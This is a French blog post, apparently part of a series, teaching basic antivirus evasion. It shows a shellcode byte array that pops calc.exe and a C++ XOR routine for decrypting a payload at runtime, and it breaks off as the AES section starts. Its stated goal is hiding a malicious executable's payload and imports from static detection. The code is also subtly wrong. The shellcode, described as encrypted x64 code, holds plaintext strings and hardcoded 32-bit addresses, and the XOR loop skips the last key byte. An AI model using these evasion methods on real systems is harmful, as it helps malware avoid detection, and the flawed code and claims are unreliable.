# Les bases de l'obfuscation

Nous avons créé ensemble dans le précédent post un exécutable utilisant l'API Windows pour exécuter un shellcode, super.

Le petit souci, c'est que les fonctions importées apparaitront directement dans la table des imports (pour plus d'informations, se référer à la troisième entrée de ma série d'article sur le format de fichier PE). Et les produits antiviraux ne sont pas bêtes ; pour ce qui touche à l'analyse statique, un exécutable qui importe le quatuor de fonctions utilisées dans le précédent post et qui inclut son payload "tel quel" va faire s'illuminer n'importe quelle console de SOC comme un sapin de noël. Dans ce post, nous allons donc visualiser les concepts basiques qu'un acteur malicieux pourrait utiliser afin d'obfusquer les signes les plus évidents de la dangerosité de son programme.

>Avertissement ; j'écris "concepts basiques" volontairement. Le but étant de montrer ici qu'il est possible d'obfusquer une fonction pour éviter qu'elle apparaisse lors d'une analyse statique, et de chiffrer un potentiel payload. En réalité, ça n'est pas avec un coup de moulinette XOR/AES et un simple appel au duo GetProcAddress/GetModuleHandle que vous allez contourner Windows Defender en l'an 2022. Mais en tant qu'introduction ? Ca fera l'affaire. Plus tard, j'aborderai peut-être des concepts plus avancés et surtout modernes, comme l'API Hashing utilisé par des acteurs malicieux de type APT, par exemple.

## Inclure un payload chiffré

Afin d'éviter qu'une solution anti-virale détecte statiquement notre payload non obfusqué, nous pouvons au préalable le chiffrer, l'inclure dans notre programme, puis le déchiffrer lors de l'exécution de notre programme. J'utiliserai deux algorithmes basiques, XOR et AES, à des fins de démonstration.

Pour commencer, remplacons les simples nullbytes de notre payload avec un magnifique shellcode faisant pop calc.exe, à des fins de démonstrations. Chiffré au préalable en dehors de ce programme, en utilisant la string "korielzeth"

```assembly
0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
0x53, 0xb8, 0x80, 0x22, 0xbf, 0x74, 0xff, 0xd0,
0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0d,
0x53, 0x50, 0xb8, 0xa0, 0x05, 0xbf, 0x74, 0xff,
0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 0x53,
0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88, 0x51,
0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52, 0x53,
0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 0xb8,
0x20, 0x4f, 0xbf, 0x74, 0xff, 0xd0, 0xe8, 0xb7,
0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c, 0x6c,
0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x58, 0xe8,
0xb6, 0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c,
0x6c, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65,
0x41, 0x58, 0xe8, 0xb4, 0xff, 0xff, 0xff, 0x63,
0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x58,
0xe8, 0xae, 0xff, 0xff, 0xff, 0x6f, 0x70, 0x65,
0x6e, 0x58
```

Long et et illisible par tout être humain normalement constitué (mes félicitations si vous arrivez à déchiffrer des opcodes x64 de visu, passez me voir à la prochaine édition de LeHack pour une bière gratuite), mais parfaitement fonctionnel. 

### XOR

La fonction visant à déchiffrer le payload une fois l'exécution commencée, plutôt simple, ressemblera à ça :


```cpp
void xordecrypt(LPWSTR payload, size_t payloadlen, LPWSTR clé, size_t clélen) {

	int j = 0;

	for (int i = 0; i < payloadlen; i++) {
		if (j == clélen - 1) j = 0;
		payload[i] = payload[i] ^ clé[j];
		j++;
	}

}
```

Où payloadlen et clélen correspondent à la longueur (via l'utilisation de sizeof() ) de notre payload et de notre clé.

### AES

La fonction visant à déchiffrer le payload une fois l'exécution commencée, plutôt simple, ressemble à ça. 

>Si vous êtes curieux concernant l'utilisation des fonctions cryptographiques de l'API Windows, vous pouvez aller jeter un oeil au deuxième post concernant mon journal de dévelopement d'une PoC de ransomware

